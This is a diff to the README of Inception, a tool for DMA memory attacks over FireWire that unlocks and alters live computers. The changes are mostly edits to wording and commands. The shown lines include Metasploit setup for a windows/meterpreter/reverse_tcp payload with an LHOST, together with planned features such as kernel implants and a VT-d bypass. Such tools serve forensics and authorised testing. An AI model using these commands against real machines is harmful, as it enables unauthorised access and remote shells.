@@ -8,7 +8,7 @@ Card and any other PCI/PCIe interfaces.
 Inception aims to provide a relatively quick, stable and easy way of performing
 intrusive and non-intrusive memory hacks against live computers using DMA.
 
-### How it all works
+### How it works
 
 Inception’s modules work as follows: By presenting a Serial Bus Protocol 2
 (SBP-2) unit directory to the victim machine over the IEEE1394 FireWire
@@ -32,10 +32,10 @@ machine; the idea that every password is correct. In other words, the
 equivalent of a [memory inception] [1].
 
 
-### BRRRRRAAAAAWWWWRWRRMRMRMMMMM!!! But why?
+### Awesome! But why?
 
 The world's forensics experts, government and agencies are using 
-[similar tools] [2], so why not you? Inception is free, as in beer. A
+[similar tools] [2] allready, so why not you? Inception is free, as in beer. A
 professional equivalent tool will set you back 10 000 USD. Hack back!
 
 
@@ -211,7 +211,7 @@ this, send me a wad of cash in unmarked dollar bills or a pull request.
 
 To use it, start `msfrpcd`:
 
-    msfrpc -P [password]
+    msfrpcd -P [password]
 
 Then launch inception:
 
@@ -232,7 +232,7 @@ if something should go awry:
     set payload windows/meterpreter/reverse_tcp
     set LHOST 172.16.1.1
     set EXITFUNC thread
-    exploit -j
+    exploit
 
 Then, in another terminal, we launch Inception:
 
@@ -264,6 +264,7 @@ Planned features
 
  * Reliable implants on x64
  * VT-D bypass
+ * Kernel (ring 0) implants
  * More signatures
  
  
@@ -274,8 +275,8 @@ Development history
            and Ubuntu Gnome unlocking  
  * 0.0.2 - Added signatures for early XP SP3, and Windows 7 x86 and x64 SP1  
  * 0.0.3 - Added some signatures (thanks Tekkenhead) and error handling  
- * 0.0.4 - Added businfo to display connected FireWire devices as well as memory
-           dumping capabilities  
+ * 0.0.4 - Added businfo to display connected FireWire devices as well as
+           memory dumping capabilities  
  * 0.0.5 - Enhanced memory dumping abilities and added samples catalog  
  * 0.0.6 - Added unit testing  
  * 0.0.7 - Updated Ubuntu signatures and priv. escalation - thanks Adel Khaldi
